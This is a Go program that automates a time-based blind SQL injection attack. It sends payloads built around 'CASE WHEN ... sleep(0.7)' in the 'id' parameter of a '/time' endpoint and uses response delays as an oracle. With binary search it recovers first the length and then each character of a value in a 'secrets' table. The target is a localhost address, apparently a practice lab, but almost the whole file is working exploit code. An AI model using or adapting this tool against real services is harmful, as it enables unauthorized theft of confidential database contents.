package main

import (
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const (
	TimingThreshold = 600 * time.Millisecond
)
const (
	ASCIImin = 32
	ASCIImax = 126
)

type HTTPClient struct {
	BaseURL string
	Client  *http.Client
	Timeout time.Duration
}

type Observation struct {
	StatusCode int
	Status     string
	Body       string
	BodyLen    int
	Elapsed    time.Duration
}

func NewHTTPClient(baseURL string, timeOut time.Duration) (HTTPClient, error) {
	if timeOut <= 0 {
		return HTTPClient{}, errors.New("timeout must be positive")
	}

	baseURL = strings.TrimRight(baseURL, "/")

	client := http.Client{
		Timeout: timeOut,
	}

	return HTTPClient{
		BaseURL: baseURL,
		Client:  &client,
		Timeout: timeOut,
	}, nil
}

func buildTimeBasedPayload(position int, ch int) string {
	return fmt.Sprintf(
		"1' AND CASE WHEN unicode(SUBSTR((SELECT value FROM secrets LIMIT 1),%d,1))>%d THEN sleep(0.7) ELSE 0 END=0-- -",
		position,
		ch,
	)
}

func buildExtractLengthPayload(length int) string {
	return fmt.Sprintf(
		"1' AND CASE WHEN LENGTH((SELECT value FROM secrets LIMIT 1))>%d THEN sleep(0.7) ELSE 0 END=0-- -",
		length,
	)
}

func (c *HTTPClient) SendPayload(payload string) (Observation, error) {
	data := url.Values{}
	data.Set("id", payload)

	targetURL := c.BaseURL + "/time?" + data.Encode()
	req, err := http.NewRequest(http.MethodGet, targetURL, nil)
	if err != nil {
		return Observation{}, fmt.Errorf("create new request %w", err)
	}

	timeStart := time.Now()

	resp, err := c.Client.Do(req)
	if err != nil {
		return Observation{}, fmt.Errorf("http client do request %w", err)
	}
	defer resp.Body.Close()

	limitedReader := io.LimitReader(resp.Body, 1024*1024)
	bodyResp, err := io.ReadAll(limitedReader)
	if err != nil {
		return Observation{}, fmt.Errorf("read response body %w", err)
	}

	elapsed := time.Since(timeStart)

	return Observation{
		Status:     resp.Status,
		StatusCode: resp.StatusCode,
		Body:       string(bodyResp),
		BodyLen:    len(bodyResp),
		Elapsed:    elapsed,
	}, nil
}

func timingOracle(obs Observation, threshold time.Duration) bool {
	return obs.Elapsed > threshold
}

func (c *HTTPClient) ExtractDataLength(minLen, maxLen int) (int, error) {
	low := minLen
	high := maxLen

	for low < high {
		mid := (low + high) / 2

		payload := buildExtractLengthPayload(mid)
		obs, err := c.SendPayload(payload)
		if err != nil {
			return 0, fmt.Errorf("send payload at position %d %w", mid, err)
		}

		ok := timingOracle(obs, TimingThreshold)

		if ok {
			low = mid + 1
		} else {
			high = mid
		}
	}

	fmt.Println("[+] Data length current result:", low)
	return low, nil
}

func (c *HTTPClient) ExtractSecretData(maxLen int, minCode int, maxCode int) (string, error) {
	var result strings.Builder

	for i := 1; i <= maxLen; i++ {
		low := minCode
		high := maxCode
		for low < high {
			mid := (low + high) / 2
			payload := buildTimeBasedPayload(i, mid)
			obs, err := c.SendPayload(payload)
			if err != nil {
				return "", fmt.Errorf("send payload on position %d with char %d: %w", i, mid, err)
			}
			ok := timingOracle(obs, TimingThreshold)

			if ok {
				low = mid + 1
			} else {
				high = mid
			}
		}
		result.WriteRune(rune(low))
		fmt.Println("[+] Current result:", result.String())
	}

	return result.String(), nil
}

func main() {
	client, err := NewHTTPClient("http://127.0.0.1:5004", 5*time.Second)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	payload := buildExtractLengthPayload(5)
	obs, err := client.SendPayload(payload)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	fmt.Println("Elapsed time:", obs.Elapsed)

	length, err := client.ExtractDataLength(0, 64)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	fmt.Println("Length data secret:", length)

	secretData, err := client.ExtractSecretData(length, ASCIImin, ASCIImax)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	fmt.Println("Secret data:", secretData)
}
